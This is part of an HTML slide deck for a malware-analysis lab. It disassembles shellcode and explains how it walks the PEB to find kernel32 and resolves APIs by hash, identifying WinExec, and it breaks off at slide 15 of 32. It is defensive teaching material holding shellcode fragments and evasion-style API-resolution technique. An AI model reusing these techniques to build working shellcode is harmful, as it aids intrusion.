@@ -1,0 +1,1553 @@
+<!DOCTYPE html>
+<!--
+  Copyright 2010 Google Inc.
+
+  Licensed under the Apache License, Version 2.0 (the "License");
+  you may not use this file except in compliance with the License.
+  You may obtain a copy of the License at
+
+     http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+
+  Original slides: Marcin Wichary (mwichary@google.com)
+  Modifications: Ernest Delgado (ernestd@google.com)
+                 Alex Russell (slightlyoff@chromium.org)
+
+  landslide modifications: Adam Zapletal (adamzap@gmail.com)
+                           Nicolas Perriault (nperriault@gmail.com)
+-->
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title>Lab 3 Writeup</title>
+    <!-- Styles -->
+    
+    <link rel="stylesheet" media="print" href="..\slideResources\theme\css\print.css">
+    <link rel="stylesheet" media="screen, projection" href="..\slideResources\theme\css\screen.css">
+    
+    
+    <!-- /Styles -->
+    <!-- Javascripts -->
+    
+    <script type="text/javascript" src="..\slideResources\theme\js\slides.js"></script>
+    
+    
+    
+    <!-- /Javascripts -->
+</head>
+<body>
+  <div id="blank"></div>
+  <div class="presentation">
+    <div id="current_presenter_notes">
+      <div id="presenter_note"></div>
+    </div>
+    <div class="slides">
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-1">
+          <div class="inner">
+            
+            <header><h1>Lab 3 Writeup</h1></header>
+            
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              1/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-2">
+          <div class="inner">
+            
+            <header><h1>Criteria</h1></header>
+            
+            
+            <section><p>Discovered what API functions were used</p>
+<p>Discovered how the API functions were resolved and what hash cipher was used</p>
+<p>What the malware created on the system</p>
+<p>How the malware traversed the PEB</p>
+<p>How the malware traversed the PE</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              2/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-3">
+          <div class="inner">
+            
+            <header><h1>Seg000</h1></header>
+            
+            
+            <section><div class="highlight"><pre>seg<span class="m">000</span><span class="nl">:00000000</span> seg<span class="m">000</span>          segment byte public <span class="s1">&#39;CODE&#39;</span> use<span class="m">32</span>
+seg<span class="m">000</span><span class="nl">:00000000</span>                 assume cs:seg000
+seg<span class="m">000</span><span class="nl">:00000000</span>                 assume es:nothing<span class="p">,</span> ss:nothing<span class="p">,</span> ds:nothing<span class="p">,</span> fs:nothing<span class="p">,</span> gs:nothing
+seg<span class="m">000</span><span class="nl">:00000000</span>                 pusha
+seg<span class="m">000</span><span class="nl">:00000001</span>                 mov     ebp<span class="p">,</span> esp
+seg<span class="m">000</span><span class="nl">:00000003</span>                 sub     esp<span class="p">,</span> <span class="m">40</span>h
+seg<span class="m">000</span><span class="nl">:00000006</span>                 mov     eax<span class="p">,</span> esp
+seg<span class="m">000</span><span class="nl">:00000008</span>                 xor     al<span class="p">,</span> al
+seg<span class="m">000</span><span class="nl">:0000000A</span>                 mov     esp<span class="p">,</span> eax
+</pre></div>
+
+<p>Function prologue... setting up stack frame. </p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              3/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-4">
+          <div class="inner">
+            
+            <header><h1>loc_c</h1></header>
+            
+            
+            <section><p>I commented that </p>
+<div class="highlight"><pre>mov     eax, dword ptr fs:loc_2D+3<span class="p">;</span> fs:loc_2D+3 is fs<span class="o">[</span>0x30<span class="o">]</span>
+</pre></div>
+
+<p>EAX = Start Of PEB </p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              4/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-5">
+          <div class="inner">
+            
+            <header><h1>PEB</h1></header>
+            
+            
+            <section><div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_PEB&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_PEB&#39;</span> <span class="p">(</span><span class="mi">584</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x0</span>   <span class="p">:</span> <span class="n">InheritedAddressSpace</span>          <span class="p">[</span><span class="s">&#39;unsigned char&#39;</span><span class="p">]</span>
+<span class="mh">0x1</span>   <span class="p">:</span> <span class="n">ReadImageFileExecOptions</span>       <span class="p">[</span><span class="s">&#39;unsigned char&#39;</span><span class="p">]</span>
+<span class="mh">0x2</span>   <span class="p">:</span> <span class="n">BeingDebugged</span>                  <span class="p">[</span><span class="s">&#39;unsigned char&#39;</span><span class="p">]</span>
+<span class="mh">0x3</span>   <span class="p">:</span> <span class="n">BitField</span>                       <span class="p">[</span><span class="s">&#39;unsigned char&#39;</span><span class="p">]</span>
+<span class="mh">0x3</span>   <span class="p">:</span> <span class="n">ImageUsesLargePages</span>            <span class="p">[</span><span class="s">&#39;BitField&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;end_bit&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;start_bit&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;native_type&#39;</span><span class="p">:</span> <span class="s">&#39;unsigned char&#39;</span><span class="p">}]</span>
+<span class="mh">0x3</span>   <span class="p">:</span> <span class="n">IsImageDynamicallyRelocated</span>    <span class="p">[</span><span class="s">&#39;BitField&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;end_bit&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s">&#39;start_bit&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="s">&#39;native_type&#39;</span><span class="p">:</span> <span class="s">&#39;unsigned char&#39;</span><span class="p">}]</span>
+<span class="mh">0x3</span>   <span class="p">:</span> <span class="n">IsLegacyProcess</span>                <span class="p">[</span><span class="s">&#39;BitField&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;end_bit&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="s">&#39;start_bit&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s">&#39;native_type&#39;</span><span class="p">:</span> <span class="s">&#39;unsigned char&#39;</span><span class="p">}]</span>
+<span class="mh">0x3</span>   <span class="p">:</span> <span class="n">IsProtectedProcess</span>             <span class="p">[</span><span class="s">&#39;BitField&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;end_bit&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s">&#39;start_bit&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;native_type&#39;</span><span class="p">:</span> <span class="s">&#39;unsigned char&#39;</span><span class="p">}]</span>
+<span class="mh">0x3</span>   <span class="p">:</span> <span class="n">SkipPatchingUser32Forwarders</span>   <span class="p">[</span><span class="s">&#39;BitField&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;end_bit&#39;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s">&#39;start_bit&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s">&#39;native_type&#39;</span><span class="p">:</span> <span class="s">&#39;unsigned char&#39;</span><span class="p">}]</span>
+<span class="mh">0x3</span>   <span class="p">:</span> <span class="n">SpareBits</span>                      <span class="p">[</span><span class="s">&#39;BitField&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;end_bit&#39;</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="s">&#39;start_bit&#39;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s">&#39;native_type&#39;</span><span class="p">:</span> <span class="s">&#39;unsigned char&#39;</span><span class="p">}]</span>
+<span class="mh">0x4</span>   <span class="p">:</span> <span class="n">Mutant</span>                         <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x8</span>   <span class="p">:</span> <span class="n">ImageBaseAddress</span>               <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0xc</span>   <span class="p">:</span> <span class="n">Ldr</span>                            <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;_PEB_LDR_DATA&#39;</span><span class="p">]]</span>
+<span class="mh">0x10</span>  <span class="p">:</span> <span class="n">ProcessParameters</span>              <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;_RTL_USER_PROCESS_PARAMETERS&#39;</span><span class="p">]]</span>
+<span class="mh">0x14</span>  <span class="p">:</span> <span class="n">SubSystemData</span>                  <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x18</span>  <span class="p">:</span> <span class="n">ProcessHeap</span>                    <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x1c</span>  <span class="p">:</span> <span class="n">FastPebLock</span>                    <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;_RTL_CRITICAL_SECTION&#39;</span><span class="p">]]</span>
+<span class="mh">0x20</span>  <span class="p">:</span> <span class="n">AtlThunkSListPtr</span>               <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x24</span>  <span class="p">:</span> <span class="n">IFEOKey</span>                        <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="p">[</span><span class="n">snip</span><span class="p">]</span>
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              5/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-6">
+          <div class="inner">
+            
+            <header><h1>mov     eax, [eax+0Ch]</h1></header>
+            
+            
+            <section><p>0xc into PEB is _PEB_LDR_DATA</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_PEB_LDR_DATA&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_PEB_LDR_DATA&#39;</span> <span class="p">(</span><span class="mi">48</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x0</span>   <span class="p">:</span> <span class="n">Length</span>                         <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x4</span>   <span class="p">:</span> <span class="n">Initialized</span>                    <span class="p">[</span><span class="s">&#39;unsigned char&#39;</span><span class="p">]</span>
+<span class="mh">0x8</span>   <span class="p">:</span> <span class="n">SsHandle</span>                       <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0xc</span>   <span class="p">:</span> <span class="n">InLoadOrderModuleList</span>          <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x14</span>  <span class="p">:</span> <span class="n">InMemoryOrderModuleList</span>        <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x1c</span>  <span class="p">:</span> <span class="n">InInitializationOrderModuleList</span> <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x24</span>  <span class="p">:</span> <span class="n">EntryInProgress</span>                <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x28</span>  <span class="p">:</span> <span class="n">ShutdownInProgress</span>             <span class="p">[</span><span class="s">&#39;unsigned char&#39;</span><span class="p">]</span>
+<span class="mh">0x2c</span>  <span class="p">:</span> <span class="n">ShutdownThreadId</span>               <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+</pre></div>
+
+<p>eax is now _PEB_LDR_DATA</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              6/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-7">
+          <div class="inner">
+            
+            <header><h1>mov     esi, [eax+14h]</h1></header>
+            
+            
+            <section><p>0x14 into _PEB_LDR_DATA is InMemoryOrderModuleList</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_LIST_ENTRY&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_LIST_ENTRY&#39;</span> <span class="p">(</span><span class="mi">8</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x0</span>   <span class="p">:</span> <span class="n">Flink</span>                          <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]]</span>
+<span class="mh">0x4</span>   <span class="p">:</span> <span class="n">Blink</span>                          <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]]</span>
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              7/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-8">
+          <div class="inner">
+            
+            <header><h1>mov     edx, [esi] <br>mov     edx, [edx]<br>mov     edx, [edx+10h]</h1></header>
+            
+            
+            <section><p><br><br><br><br>
+Traverse the _LIST_ENTRY structure to the 3rd entry and then extract offset 0x10 </p>
+<p>We are looking at DLLs, so _LIST_ENTRY is _LDR_DATA_TABLE_ENTRY</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_LDR_DATA_TABLE_ENTRY&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_LDR_DATA_TABLE_ENTRY&#39;</span> <span class="p">(</span><span class="mi">120</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x0</span>   <span class="p">:</span> <span class="n">InLoadOrderLinks</span>               <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x8</span>   <span class="p">:</span> <span class="n">InMemoryOrderLinks</span>             <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x10</span>  <span class="p">:</span> <span class="n">InInitializationOrderLinks</span>     <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x18</span>  <span class="p">:</span> <span class="n">DllBase</span>                        <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x1c</span>  <span class="p">:</span> <span class="n">EntryPoint</span>                     <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x20</span>  <span class="p">:</span> <span class="n">SizeOfImage</span>                    <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x24</span>  <span class="p">:</span> <span class="n">FullDllName</span>                    <span class="p">[</span><span class="s">&#39;_UNICODE_STRING&#39;</span><span class="p">]</span>
+<span class="mh">0x2c</span>  <span class="p">:</span> <span class="n">BaseDllName</span>                    <span class="p">[</span><span class="s">&#39;_UNICODE_STRING&#39;</span><span class="p">]</span>
+<span class="mh">0x34</span>  <span class="p">:</span> <span class="n">Flags</span>                          <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x38</span>  <span class="p">:</span> <span class="n">LoadCount</span>                      <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x3a</span>  <span class="p">:</span> <span class="n">TlsIndex</span>                       <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x3c</span>  <span class="p">:</span> <span class="n">HashLinks</span>                      <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x3c</span>  <span class="p">:</span> <span class="n">SectionPointer</span>                 <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x40</span>  <span class="p">:</span> <span class="n">CheckSum</span>                       <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x44</span>  <span class="p">:</span> <span class="n">LoadedImports</span>                  <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x44</span>  <span class="p">:</span> <span class="n">TimeDateStamp</span>                  <span class="p">[</span><span class="s">&#39;UnixTimeStamp&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;is_utc&#39;</span><span class="p">:</span> <span class="bp">True</span><span class="p">}]</span>
+<span class="mh">0x48</span>  <span class="p">:</span> <span class="n">EntryPointActivationContext</span>    <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;_ACTIVATION_CONTEXT&#39;</span><span class="p">]]</span>
+<span class="mh">0x4c</span>  <span class="p">:</span> <span class="n">PatchInformation</span>               <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x50</span>  <span class="p">:</span> <span class="n">ForwarderLinks</span>                 <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x58</span>  <span class="p">:</span> <span class="n">ServiceTagLinks</span>                <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x60</span>  <span class="p">:</span> <span class="n">StaticLinks</span>                    <span class="p">[</span><span class="s">&#39;_LIST_ENTRY&#39;</span><span class="p">]</span>
+<span class="mh">0x68</span>  <span class="p">:</span> <span class="n">ContextInformation</span>             <span class="p">[</span><span class="s">&#39;pointer&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;void&#39;</span><span class="p">]]</span>
+<span class="mh">0x6c</span>  <span class="p">:</span> <span class="n">OriginalBase</span>                   <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x70</span>  <span class="p">:</span> <span class="n">LoadTime</span>                       <span class="p">[</span><span class="s">&#39;WinTimeStamp&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#39;is_utc&#39;</span><span class="p">:</span> <span class="bp">True</span><span class="p">}]</span>
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              8/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-9">
+          <div class="inner">
+            
+            <header><h1>mov     edx, [edx+10h]</h1></header>
+            
+            
+            <section><p>Offset 0x10 is InInitializationOrderLinks... can't be right, can it?</p>
+<p>We are in the InMemoryOrderLinks at offset 0x08...</p>
+<p>0x08 + 0x10 = 0x18</p>
+<p>0x18 = DllBase Address</p>
+<p>Edx = Kernel32.dll DllBase</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              9/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-10">
+          <div class="inner">
+            
+            <header><h1>How?</h1></header>
+            
+            
+            <section><p>Kernel32.dll is always the third entry in the InMemoryOrderLinks </p>
+<div class="highlight"><pre><span class="nl">:000</span>&gt; !peb
+PEB at <span class="m">7</span>efde<span class="m">000</span>
+    InheritedAddressSpace:    No
+    ReadImageFileExecOptions: No
+    BeingDebugged:            Yes
+    ImageBaseAddress:         <span class="m">00400000</span>
+    Ldr                       <span class="m">76</span>fa<span class="m">0200</span>
+    Ldr.Initialized:          Yes
+    Ldr.InInitializationOrderModuleList: <span class="m">006</span>e<span class="m">3</span>d<span class="m">48</span> . <span class="m">006</span>e<span class="m">4</span>a<span class="m">90</span>
+    Ldr.InLoadOrderModuleList:           <span class="m">006</span>e<span class="m">3</span>ca<span class="m">8</span> . <span class="m">006</span>e<span class="m">4</span>a<span class="m">80</span>
+    Ldr.InMemoryOrderModuleList:         <span class="m">006</span>e<span class="m">3</span>cb<span class="m">0</span> . <span class="m">006</span>e<span class="m">4</span>a<span class="m">88</span>
+            Base TimeStamp                     Module
+          <span class="m">400000</span> <span class="m">002198</span>e<span class="m">8</span> Jan <span class="m">26</span> <span class="m">03</span><span class="nl">:37:12</span> <span class="m">1970</span> C:\shellcode\corelan<span class="m">9</span>\msb.exe
+        <span class="m">76</span>ea<span class="m">0000</span> <span class="m">5507</span>b<span class="m">3</span>e<span class="m">0</span> Mar <span class="m">16</span> <span class="m">21</span><span class="nl">:56:00</span> <span class="m">2015</span> C:\Windows\SysWOW<span class="m">64</span>\ntdll.dll
+        <span class="m">75</span>ab<span class="m">0000</span> <span class="m">5507</span>b<span class="m">484</span> Mar <span class="m">16</span> <span class="m">21</span><span class="nl">:58:44</span> <span class="m">2015</span> C:\Windows\syswow<span class="m">64</span>\kernel<span class="m">32</span>.dll
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              10/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-11">
+          <div class="inner">
+            
+            <header><h1>Continuing</h1></header>
+            
+            
+            <section><div class="highlight"><pre>seg000:00000020                 mov     <span class="o">[</span>ebp-4<span class="o">]</span>, edx
+seg000:00000023                 push    eax
+seg000:00000024                 push    esi
+seg000:00000025                 push    0E8AFE98h
+seg000:0000002A                 push    dword ptr <span class="o">[</span>ebp-4<span class="o">]</span>
+seg000:0000002D
+seg000:0000002D loc_2D:                                 <span class="p">;</span> DATA XREF: seg000:loc_Cr
+seg000:0000002D                 call    sub_AB
+</pre></div>
+
+<p>eax = _PEB_LDR_DATA</p>
+<p>esi = InMemoryOrderModuleList</p>
+<p>0E8AFE98h = Function hash</p>
+<p>[ebp-4] = DllBase</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              11/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-12">
+          <div class="inner">
+            
+            <header><h1>0E8AFE98h Hash</h1></header>
+            
+            
+            <section><div class="highlight"><pre>C:\Users\Topher<span class="p">&gt;</span><span class="n">hashing</span>.py <span class="n">/mod</span> c:\windows\system<span class="m">32</span> kernel<span class="m">32</span>
+.dll <span class="p">|</span> <span class="n">grep</span> E<span class="m">8</span>AFE<span class="m">98</span>
+[+] <span class="m">0</span>xE<span class="m">8</span>AFE<span class="m">98</span> <span class="o">=</span> kernel<span class="m">32</span>.dll!WinExec
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              12/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-13">
+          <div class="inner">
+            
+            <header><h1>sub_AB</h1></header>
+            
+            
+            <section><p>Called twice in the shellcode... figure it out once! </p>
+<p><img alt="" src="..\slideResources\labs\sub_ab.png" /></p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              13/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-14">
+          <div class="inner">
+            
+            <header><h1>sub_AB</h1></header>
+            
+            
+            <section><div class="highlight"><pre>seg<span class="m">000</span><span class="nl">:000000AB</span>                 pusha
+seg<span class="m">000</span><span class="nl">:000000AC</span>                 mov     ebp<span class="p">,</span> [esp+<span class="m">20</span>h+arg_<span class="m">0</span>] #arg_o is <span class="m">4</span>
+</pre></div>
+
+<p>Build the stack to see what 20h + 4 is... </p>
+<p>We had 4 pushes onto this stack before call</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              14/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-15">
+          <div class="inner">
+            
+            <header><h1>Stack</h1></header>
+            
+            
+            <section><pre><code>    L| ESI                     | &lt;--- ESP 
+     | EBP                     |
+     | ESP                     |
+     | EBX                     |
+     | EDX                     |
+     | ECX                     | 
+     | EAX                     |
+     | DllBase                 |
+     | Function Hash           |
+     | InMemoryOrderModuleList |
+    H| PEB                     |
+</code></pre>
+<p>ebp, [esp+20h+arg_0] #arg_o is 4 = ESP + 0x24</p>
+<p>ESP+0x24 = DllBase                  </p></section>
+            
+          </div>
+          <div class="presenter_notes">
